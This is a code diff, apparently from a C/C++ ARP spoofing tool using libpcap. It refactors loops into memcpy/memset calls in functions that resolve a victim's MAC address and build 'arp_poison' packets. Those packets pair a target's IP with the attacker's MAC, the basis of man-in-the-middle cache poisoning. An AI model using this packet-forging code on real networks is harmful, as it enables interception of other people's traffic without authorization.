@@ -17,6 +17,7 @@ void convert_argv_into_ip(uint8_t* IP, char* argv)
         p = strtok(NULL, ".");
         i++;
     }
+    free(IPstring);
 }
 
 void get_attacker_info(uint8_t* attackermac, char* dev)
@@ -42,12 +43,10 @@ void get_attacker_info(uint8_t* attackermac, char* dev)
 void get_sender_MAC(pcap_t* fp, const uint8_t* attacker_MAC, const uint8_t* sender_IP, uint8_t* sender_mac)
 {
     arp_packet arp_req_packet;
+
     //Ethernet header
-    for (int i=0; i < 6; i++)
-    {
-        arp_req_packet.eth_hdr.h_dest[i] = 0xff;   //set broadcast MAC
-        arp_req_packet.eth_hdr.h_source[i] = attacker_MAC[i];    //set source MAC
-    }
+    memset(arp_req_packet.eth_hdr.h_dest, 0xff, 6);
+    memcpy(arp_req_packet.eth_hdr.h_source, attacker_MAC, 6);
     arp_req_packet.eth_hdr.h_proto = htons(ETH_P_ARP);
 
     //ARP header
@@ -56,16 +55,11 @@ void get_sender_MAC(pcap_t* fp, const uint8_t* attacker_MAC, const uint8_t* send
     arp_req_packet.arp_hdr.ea_hdr.ar_hln = 0x06;
     arp_req_packet.arp_hdr.ea_hdr.ar_pln = 0x04;
     arp_req_packet.arp_hdr.ea_hdr.ar_op = htons(ARPOP_REQUEST);
-    for (int i = 0; i < 6; i++)
-    {
-        arp_req_packet.arp_hdr.arp_sha[i] = attacker_MAC[i];
-        arp_req_packet.arp_hdr.arp_tha[i] = 0x00;
-    }
-    for (int i = 0; i < 4; i++)
-    {
-        arp_req_packet.arp_hdr.arp_spa[i] = 0x00;
-        arp_req_packet.arp_hdr.arp_tpa[i] = sender_IP[i];
-    }
+
+    memcpy(arp_req_packet.arp_hdr.arp_sha, attacker_MAC, 6);
+    memset(arp_req_packet.arp_hdr.arp_tha, 0x00, 6);
+    memset(arp_req_packet.arp_hdr.arp_spa, 0x00, 4);
+    memcpy(arp_req_packet.arp_hdr.arp_tpa, sender_IP, 4);
 
     //send
     u_char arp_to_send[42];
@@ -87,19 +81,11 @@ void get_sender_MAC(pcap_t* fp, const uint8_t* attacker_MAC, const uint8_t* send
 //            printf("%u bytes captured\n", header->caplen);
             arp_packet* arp_rep_packet = reinterpret_cast<arp_packet*>(const_cast<u_char*>(packet));
 
-            for (int i = 0; i < 4; i++)                 //checking part1 (IP address)
-            {
-                if(arp_req_packet.arp_hdr.arp_tpa[i] != arp_rep_packet->arp_hdr.arp_spa[i])
-                {
-                    break;
-                }
-            }
+            if(memcmp(arp_req_packet.arp_hdr.arp_tpa, arp_rep_packet->arp_hdr.arp_spa, 4) != 0) //checking part1 (IP address)
+                continue;
             if (ntohs(arp_rep_packet->eth_hdr.h_proto) == ETH_P_ARP)// checking part2 (ethernet protocol type)
             {
-                for (int i = 0; i < 6; i++)
-                {
-                    sender_mac[i] = arp_rep_packet->arp_hdr.arp_sha[i];
-                }
+                memcpy(sender_mac, arp_rep_packet->arp_hdr.arp_sha, 6);
                 return;
             }
         }
@@ -124,17 +110,10 @@ void arp_spoof(pcap_t* fp, uint8_t* sender_MAC, uint8_t* sender_IP, uint8_t* att
     arp_poison.arp_hdr.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
     arp_poison.arp_hdr.ea_hdr.ar_pro = htons(0x0800);
 
-    for (int i = 0 ; i < 6; i++)
-    {
-        arp_poison.arp_hdr.arp_sha[i] = attacker_MAC[i];
-        arp_poison.arp_hdr.arp_tha[i] = sender_MAC[i];
-    }
-
-    for (int i = 0; i < 4; i++)
-    {
-        arp_poison.arp_hdr.arp_spa[i] = target_IP[i];
-        arp_poison.arp_hdr.arp_tpa[i] = sender_IP[i];
-    }
+    memcpy(arp_poison.arp_hdr.arp_sha, attacker_MAC, 6);
+    memcpy(arp_poison.arp_hdr.arp_tha, sender_MAC, 6);
+    memcpy(arp_poison.arp_hdr.arp_spa, target_IP, 4);
+    memcpy(arp_poison.arp_hdr.arp_tpa, sender_IP, 4);
 
     //casting
     u_char arp_to_send[42];
